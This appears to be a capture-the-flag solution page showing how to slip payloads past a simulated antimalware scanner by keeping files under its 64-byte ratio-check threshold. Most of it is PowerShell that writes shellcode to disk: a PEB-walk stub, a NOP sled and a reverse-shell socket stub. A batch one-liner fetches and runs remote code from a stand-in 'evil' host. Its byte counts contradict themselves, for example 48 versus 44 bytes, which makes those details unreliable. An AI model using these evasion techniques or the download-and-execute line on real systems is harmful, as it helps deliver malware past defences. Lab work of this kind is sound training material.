---
title: "Solution 17: Sub-64 Size Gate"
challenge_number: 17
difficulty: medium
category: "Non-Printable Ratio Bypass"
permalink: /solutions/17-sub64-size-gate/
---

# Solution: Sub-64 Size Gate

[Back to Challenge](../challenges/17-sub64-size-gate.md)

## Overview

The non-printable ratio check only activates for files **64 bytes or larger**. By keeping the file under 64 bytes, you completely skip the ratio check — even if the file is 100% non-printable binary content.

## Working Code

### Example 1: Minimal x64 Shellcode (48 bytes)

This is a minimal x64 Windows shellcode stub that calls `ExitProcess(0)`:

```powershell
# 48-byte x64 shellcode: ExitProcess(0) via PEB walk
# This is 100% non-printable binary - but at 48 bytes, the ratio check is skipped
$shellcode = [byte[]](
    0x48, 0x31, 0xC9,                   # xor rcx, rcx
    0x48, 0x31, 0xD2,                   # xor rdx, rdx
    0x65, 0x48, 0x8B, 0x04, 0x25,       # mov rax, gs:[0x60]  (PEB)
    0x60, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x40, 0x18,             # mov rax, [rax+0x18] (PEB_LDR_DATA)
    0x48, 0x8B, 0x40, 0x20,             # mov rax, [rax+0x20] (InMemoryOrderModuleList)
    0x48, 0x8B, 0x00,                   # mov rax, [rax]      (next entry)
    0x48, 0x8B, 0x00,                   # mov rax, [rax]      (next entry - kernel32)
    0x48, 0x8B, 0x40, 0x20,             # mov rax, [rax+0x20] (DllBase)
    0x49, 0x89, 0xC0,                   # mov r8, rax         (kernel32 base)
    0x48, 0x31, 0xC9,                   # xor rcx, rcx        (exit code 0)
    0xEB, 0xFE                          # jmp $ (placeholder for ExitProcess call)
)
# Size: 44 bytes - well under the 64-byte threshold

[System.IO.File]::WriteAllBytes("tiny_shellcode.bin", $shellcode)
Write-Host "File size: $($shellcode.Length) bytes (threshold: 64)"
Write-Host "Ratio check applies: $($shellcode.Length -ge 64)"
# Output: File size: 44 bytes (threshold: 64)
# Output: Ratio check applies: False
```

### Example 2: NOP Sled + JMP (63 bytes)

```powershell
# Maximum size that still bypasses: 63 bytes
# 61 NOPs (0x90) + 2-byte short jump
$nops = [byte[]](0x90) * 61
$jmp = [byte[]](0xEB, 0xFE)  # jmp $ (infinite loop / placeholder)
$payload = $nops + $jmp

[System.IO.File]::WriteAllBytes("nopsled.bin", $payload)
Write-Host "File size: $($payload.Length) bytes"
# Output: File size: 63 bytes - just under the threshold!
```

### Example 3: Compact x64 Reverse Shell Stub (56 bytes)

```powershell
# 56-byte x64 stub: sets up socket call parameters
# Real-world compact shellcode that fits under 64 bytes
$stub = [byte[]](
    0x6A, 0x29,                         # push 0x29 (sys_socket)
    0x58,                               # pop rax
    0x6A, 0x02,                         # push 2 (AF_INET)
    0x5F,                               # pop rdi
    0x6A, 0x01,                         # push 1 (SOCK_STREAM)
    0x5E,                               # pop rsi
    0x48, 0x31, 0xD2,                   # xor rdx, rdx
    0x0F, 0x05,                         # syscall
    0x48, 0x89, 0xC7,                   # mov rdi, rax (socket fd)
    0x48, 0x31, 0xC0,                   # xor rax, rax
    0x50,                               # push rax
    0xC7, 0x44, 0x24, 0xFC,             # mov dword [rsp-4], ...
    0x7F, 0x00, 0x00, 0x01,             # 127.0.0.1
    0x66, 0xC7, 0x44, 0x24, 0xFA,       # mov word [rsp-6], ...
    0x11, 0x5C,                         # port 4444
    0x66, 0xC7, 0x44, 0x24, 0xF8,       # mov word [rsp-8], ...
    0x02, 0x00,                         # AF_INET
    0x48, 0x83, 0xEC, 0x08,             # sub rsp, 8
    0x6A, 0x2A,                         # push 0x2a (sys_connect)
    0x58,                               # pop rax
    0x48, 0x89, 0xE6,                   # mov rsi, rsp
    0x6A, 0x10,                         # push 16
    0x5A,                               # pop rdx
    0x0F, 0x05                          # syscall
)

[System.IO.File]::WriteAllBytes("stub.bin", $stub)
Write-Host "File size: $($stub.Length) bytes"
# Output: File size: 56 bytes - under 64, ratio check skipped
```

### Example 4: Tiny Batch File (Under 64 Bytes)

```powershell
# Even script files work - this is 30 bytes and 100% printable,
# but demonstrates that small files skip ALL non-printable checks
$script = "powershell -ep bypass -c iex(irm http://evil)"  # 48 bytes
Set-Content -Path "tiny.bat" -Value $script -NoNewline

Write-Host "File size: $($script.Length) bytes"
# Under 64 bytes - ratio check never fires
```

## Why It Works

The scanner's non-printable ratio check has an explicit size gate:

```nim
if content.len < 64:
    # Skip the non-printable ratio check entirely
    return
```

This means:
- Files < 64 bytes: **ratio check is never performed**, regardless of content
- Files >= 64 bytes: ratio check runs, flags if > 40% non-printable

The rationale (from the scanner's perspective) is that very small files produce unreliable statistics — a 4-byte file with 3 non-printable bytes would be "75% non-printable" but is likely just a tiny data fragment, not malware.

### The Bypass Logic

```
File: 63 bytes of pure shellcode (100% non-printable)

Scanner logic:
  1. Read file: 63 bytes
  2. Check size: 63 < 64? YES
  3. Skip ratio check → file passes

vs.

File: 64 bytes of pure shellcode (100% non-printable)

Scanner logic:
  1. Read file: 64 bytes
  2. Check size: 64 < 64? NO
  3. Calculate ratio: 64/64 = 1.00
  4. 1.00 > 0.40? YES → FLAGGED
```

The difference between detection and bypass is literally **one byte** of file size.

### Practical Limits

63 bytes is enough for:
- Basic x64 shellcode stubs (syscall setup, PEB walking)
- Stage-0 loaders that fetch larger payloads
- NOP sleds with jump targets
- Simple system call sequences

## How to Verify

1. Create a 63-byte fully non-printable file:
   ```powershell
   $bytes = [byte[]](0x90) * 63
   [System.IO.File]::WriteAllBytes("test_63.bin", $bytes)
   ```

2. Create a 64-byte fully non-printable file for comparison:
   ```powershell
   $bytes = [byte[]](0x90) * 64
   [System.IO.File]::WriteAllBytes("test_64.bin", $bytes)
   ```

3. Run the scanner on both:
   ```
   nim_antimalware_sim.exe test_63.bin
   nim_antimalware_sim.exe test_64.bin
   ```

4. Expected results:
   - `test_63.bin`: **No detection** — ratio check skipped (size < 64)
   - `test_64.bin`: **DETECTED** — ratio = 1.00 > 0.40

5. Verify file sizes:
   ```powershell
   (Get-Item "test_63.bin").Length  # 63
   (Get-Item "test_64.bin").Length  # 64
   ```
